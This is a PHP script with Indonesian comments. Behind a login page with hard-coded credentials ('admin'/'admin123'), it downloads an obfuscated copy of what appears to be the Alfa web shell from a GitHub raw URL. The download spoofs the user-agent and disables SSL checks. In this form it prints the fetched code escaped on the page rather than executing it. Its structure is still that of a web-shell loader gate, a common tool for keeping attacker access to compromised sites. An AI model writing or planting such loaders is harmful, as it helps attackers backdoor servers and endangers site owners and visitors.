<?php
session_start();

// Konfigurasi username dan password yang di-hash
$valid_username = 'admin';
$valid_password_hash = password_hash('admin123', PASSWORD_BCRYPT);

// Fungsi untuk memeriksa otentikasi
function isAuthenticated() {
    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
}

// Fungsi untuk menampilkan halaman login
function showLogin($error = '') {
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f4; }
            .login-box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; }
            .login-box h2 { margin-bottom: 20px; text-align: center; color: #333; }
            .login-box p.error { color: red; font-size: 14px; margin-bottom: 10px; }
            .login-box input[type="text"], .login-box input[type="password"] { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; }
            .login-box input[type="submit"] { width: 100%; padding: 10px; background: #28a745; border: none; color: white; font-size: 16px; cursor: pointer; border-radius: 4px; }
            .login-box input[type="submit"]:hover { background: #218838; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>Login</h2>
            <p class="error">' . htmlspecialchars($error) . '</p>
            <form method="POST" action="">
                <input type="text" name="username" placeholder="Username" required><br>
                <input type="password" name="password" placeholder="Password" required><br>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>';
}

// Cek apakah pengguna sudah terotentikasi
if (!isAuthenticated()) {
    // Jika pengguna mengirimkan formulir login
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = trim($_POST['username'] ?? '');
        $password = trim($_POST['password'] ?? '');

        // Validasi kredensial
        if ($username === $valid_username && password_verify($password, $valid_password_hash)) {
            $_SESSION['authenticated'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']); // Redirect setelah login berhasil
            exit();
        } else {
            showLogin("Username atau Password salah!");
            exit();
        }
    } else {
        // Tampilkan halaman login jika belum login
        showLogin();
        exit();
    }
}

// Jika pengguna sudah terotentikasi, tampilkan konten asli
/**
 * Fungsi untuk mendapatkan isi dari URL
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $response = curl_exec($conn);
        curl_close($conn);
        return $response;
    } elseif (function_exists('file_get_contents')) {
        return file_get_contents($url);
    } else {
        return false;
    }
}

// Ambil isi dari URL
$url_content = geturlsinfo('https://raw.githubusercontent.com/nicxlau/alfa-shell/refs/heads/master/alfa-obfuscated.php');

// Tampilkan isi dari URL
if ($url_content !== false) {
    echo '<pre>' . htmlspecialchars($url_content) . '</pre>';
} else {
    echo '<p>Gagal mengambil data dari URL.</p>';
}
?>
